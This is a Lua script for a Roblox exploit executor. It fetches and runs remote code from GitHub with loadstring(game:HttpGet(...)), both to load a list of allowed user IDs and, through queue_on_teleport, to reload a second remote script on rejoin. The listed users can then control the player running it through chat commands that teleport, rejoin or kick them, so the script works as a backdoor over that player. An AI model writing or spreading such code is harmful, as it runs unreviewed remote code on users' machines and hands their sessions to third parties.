local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6hfeuopteafumbvyue507421.lua"
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local allowedUserIds = {}

local success, result = pcall(function()
    return loadstring(game:HttpGet(url))()
end)

if success then
    allowedUserIds = result
else
    warn("Failed to load allowed User IDs:", result)
end

local function isAllowed(player)
    for _, allowedId in ipairs(allowedUserIds) do
        if tostring(player.UserId) == tostring(allowedId) then
            return true
        end
    end
    return false
end

local function bringExecutorToCaller(caller)
    if caller and caller.Character and LocalPlayer.Character then
        local callerHRP = caller.Character:FindFirstChild("HumanoidRootPart")
        local executorHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            executorHRP.CFrame = callerHRP.CFrame
        end
    end
end

local function rejoinExecutor()
    if queue_on_teleport then
        queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Estplugs/test/refs/heads/main/lua"))()')
    end
    TeleportService:Teleport(PlaceId, LocalPlayer)
end

local function kickExecutor()
    LocalPlayer:Kick("You have been kicked by an allowed player.")
end

local function checkExistingPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        player.Chatted:Connect(function(message)
            if isAllowed(player) then
                if message == "?bring" then
                    bringExecutorToCaller(player)
                elseif message == "?rj" then
                    rejoinExecutor()
                elseif message == "?kick" then
                    kickExecutor()
                end
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if isAllowed(player) then
            if message == "?bring" then
                bringExecutorToCaller(player)
            elseif message == "?rj" then
                rejoinExecutor()
            elseif message == "?kick" then
                kickExecutor()
            end
        end
    end)
end)

checkExistingPlayers()

RunService.Heartbeat:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if isAllowed(player) then
            break
        end
    end
end)
